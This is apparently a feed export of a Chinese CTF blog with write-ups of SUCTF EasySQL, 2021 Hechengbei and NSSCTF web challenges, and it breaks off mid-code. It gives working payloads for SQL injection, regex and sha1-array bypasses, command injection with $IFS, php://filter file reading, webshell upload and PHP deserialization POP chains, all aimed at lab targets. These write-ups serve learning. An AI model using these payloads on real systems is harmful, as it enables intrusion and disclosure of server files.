alt="image-20211010194709636"></p><p>看了wp才知道，原来是要去猜测出本来的sql语句查询时什么样的</p><p><strong>select $_POST[‘query’] || flag from Flag</strong></p><p>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p><p>因此只需要将</p><p>$_POST[‘query’]<br>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql=select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为</p><p>*,1<br>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p><p>执行payload：*,1</p><p><img src="/2021/10/10/nss/0/image-20211010195151922.png" alt="image-20211010195151922"></p><p>得到flag</p><ul><li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p></li><li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p></li><li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p></li><li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode 说明</a></p></li><li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 参考链接：&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://www.cnblogs.com/peri0d/p/11598597.html&quot;&gt;SUCTF 2019]EasySQL - peri0d - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[(4条消息</summary>
      
    
    
    
    
    <category term="nss" scheme="http://daweitech.github.io/tags/nss/"/>
    
  </entry>
  
  <entry>
    <title>2021鹤城杯</title>
    <link href="http://daweitech.github.io/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <id>http://daweitech.github.io/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-10T01:16:07.000Z</published>
    <updated>2021-10-12T11:57:57.567Z</updated>
    
    <content type="html"><![CDATA[<pre><code> 这次的比赛虽然听说都是原题，但是基本没遇到过，这次看着writeup总结一下</code></pre><p> 复现一下某些题目</p><h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>第一层绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$aaa &#x3D; preg_replace(&#39;&#x2F;^(.*)level(.*)$&#x2F;&#39;, &#39;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#39;, $_GET[&#39;aaa&#39;]);</span><br><span class="line"></span><br><span class="line">   if(preg_match(&#39;&#x2F;pass_the_level_1#&#x2F;&#39;, $aaa))&#123;</span><br><span class="line">       echo &quot;here is level 2&quot;;</span><br></pre></td></tr></table></figure><p>get类型取得变量a的值，正则替换和匹配函数</p><p>这里直接用%0a和%23绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aaa&#x3D;%0apass_the_level_1%23</span><br></pre></td></tr></table></figure><p>第二层绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">       <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br></pre></td></tr></table></figure><p>md5数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin[]&#x3D;1&amp;root_pwd[]&#x3D;2</span><br></pre></td></tr></table></figure><p>第三层绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                  $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br></pre></td></tr></table></figure><p>要经过js-encode编码一下，虽然我们不懂值是多少，但弱等于就好了</p><p>直接{“result”:0}</p><p>最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：?aaa&#x3D;%0apass_the_level_1%23</span><br><span class="line"></span><br><span class="line">POST:admin[]&#x3D;1&amp;root_pwd[]&#x3D;2&amp;level_3&#x3D;&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure><h3 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h3><p>这题当初只有稍微看了看，没想到竟然有类似的原题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($guess === $secret) &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>开头就讲明包含了utils.php</p><p>接着POST传参，涉及到好多过滤</p><p>采用Y1ng大佬思路：<a href="https://www.gem-love.com/ctf/1898.html">🇯🇵zer0pts CTF 2020 Writeup – 颖奇L’Amore (gem-love.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;utils\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则的匹配 ban 掉了 config.php。然后会 <code>highlight_file()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;show_source&#39;])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">    exit();</span><br></pre></td></tr></table></figure><p>可以发现这里加上了 <code>basename()</code> 可能是为了跨目录读文件，而问题正好出在了这里，</p><p>演示：</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012193624036.png" alt="image-20211012193624036"></p><p>可以看到被挡了，但至少说明我们思路正确</p><p>当我访问 index.php 时，我可以在后面加上一些东西，比如 /index.php/utils.php，这样仍然访问的是 index.php，但经过 <code>basename()</code> 后，传进 <code>highlight_file()</code> 函数的文件名就变成了 utils.php，如果能绕过那个正则，就可以得到 utils.php 源码了，而题目告诉 FLAG 就在 config.php 里，这道题就做完了。</p><p>可以发现，这个正则匹配了 utils.php/ 为 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 的结尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils\.php\&#x2F;*$&#x2F;i</span><br></pre></td></tr></table></figure><p>老套路了，可以用 %0d 之类的来污染绕过，这样仍然访问得到 index.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;utils.php%0d</span><br></pre></td></tr></table></figure><p>然后看了大佬的wp，直接打？</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194757043.png" alt="image-20211012194757043"></p><p>我对这个%81不是很理解，在本地试了一下</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194837502.png" alt="image-20211012194837502"></p><p>这个符号？？？</p><p>不过还真的一打就成，可是原理我不太懂啊</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194930406.png" alt="image-20211012194930406"></p><p>还得问问大佬</p>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt; 这次的比赛虽然听说都是原题，但是基本没遇到过，这次看着writeup总结一下&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 复现一下某些题目&lt;/p&gt;
&lt;h3 id=&quot;Middle-magic&quot;&gt;&lt;a href=&quot;#Middle-magic&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://daweitech.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF 2021 writeup</title>
    <link href="http://daweitech.github.io/2021/10/04/web/2/"/>
    <id>http://daweitech.github.io/2021/10/04/web/2/</id>
    <published>2021-10-04T02:36:35.000Z</published>
    <updated>2021-10-10T03:05:59.158Z</updated>
    
    <content type="html"><![CDATA[<p>参与了一下</p><p>新生赛，发现基础还不够扎实</p><p>顺便记录一下解题</p><h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p><img src="/2021/10/04/web/2/image-20211004103854327.png"></p><p>按照题目提示，F12</p><p>最开始无脑往下滑，被嘲讽了一波</p><p><img src="/2021/10/04/web/2/image-20211004104026843.png" alt="image-20211004104026843"></p><p>本来以为还要控制台修改时间获取</p><p>结果再往上找找就行</p><p><img src="/2021/10/04/web/2/image-20211004104228392.png" alt="image-20211004104228392"></p><h3 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h3><p><img src="/2021/10/04/web/2/image-20211004104329873.png" alt="image-20211004104329873"></p><p>提示足够明显了</p><p>直接连，这时候直接猜想到index.php文件（也可以不嫌麻烦dirsearch扫）</p><p>试着连</p><p><img src="/2021/10/04/web/2/image-20211004104536627.png" alt="image-20211004104536627"></p><p>成功连上</p><p><img src="/2021/10/04/web/2/image-20211004104630630.png" alt="image-20211004104630630"></p><h3 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h3><p>题如其意，很简单</p><p><img src="/2021/10/04/web/2/image-20211004104742735.png" alt="image-20211004104742735"></p><p><img src="/2021/10/04/web/2/image-20211004105437367.png" alt="image-20211004105437367"></p><p><img src="/2021/10/04/web/2/image-20211004105448146.png" alt="image-20211004105448146"></p><h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>这题很眼熟</p><p>很像之前做过的</p><p><img src="/2021/10/04/web/2/image-20211004110036413.png" alt="image-20211004110036413"></p><p><img src="/2021/10/04/web/2/image-20211004110055171.png" alt="image-20211004110055171"></p><p>这里抓包会被克制</p><p>直接用hackbar</p><p><img src="/2021/10/04/web/2/image-20211004110238860.png" alt="image-20211004110238860"></p><h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p><img src="/2021/10/04/web/2/image-20211004110322862.png" alt="image-20211004110322862"></p><p>数组绕过即可</p><p><img src="/2021/10/04/web/2/image-20211004110433124.png" alt="image-20211004110433124"></p><h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>改类型上传php，没什么好说的</p><h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p>上传phtml马文件绕过，蚁剑连上</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>基础题，直接查数据库，查表，最后查字名</p><h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><p>命令执行漏洞</p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p><h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><p><img src="/2021/10/04/web/2/QQ%E5%9B%BE%E7%89%8720211004210427.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9&#x2F;flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>伪协议读取</p><p>php://filter/read=convert.base64.encode/resource=flag.php</p><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></p><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/web/2/image-20211004210242660.png" alt="image-20211004210242660"></p><p>这题虽然很简单，被我当时秒解的原因竟然是误打误撞（doge）</p><p>打开靶机，可爱的小胡桃</p><p><img src="/2021/10/04/web/2/image-20211009205021612.png" alt="image-20211009205021612"></p><p>f12看下</p><p><img src="/2021/10/04/web/2/image-20211009205055755.png" alt="image-20211009205055755"></p><p>提示很明显了，robots协议</p><p><img src="/2021/10/04/web/2/image-20211009205151043.png" alt="image-20211009205151043"></p><p>访问一下就有题目源码了：</p><p><img src="/2021/10/04/web/2/image-20211009205233533.png" alt="image-20211009205233533"></p><p>很简单的序列化，唯一要注意的点是，我们想让类 wllm的属性admin和passwd的值为admin和ctf，</p><p>而魔术方法构造却会强迫让他们值变成user和123456</p><p>所以我们序列化的时候直接删去就好，就不会触发了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> wllm();</span><br><span class="line"><span class="keyword">echo</span>(serialize($p));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009205525269.png" alt="image-20211009205525269"></p><h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">php反序列化漏洞绕过魔术方法 __wakeup - Mrsm1th - 博客园 (cnblogs.com)</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，他验证的时候是不会进行url解码的</p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> $admin = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">  <span class="keyword">protected</span> $passwd = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> $w22m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们来分析分析</p><p>总共分为了三个类对吧，最终的目的是想触发第一个类class w44m里的GetFlag()了</p><p>我们要充分利用这三个类</p><p>payload的部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 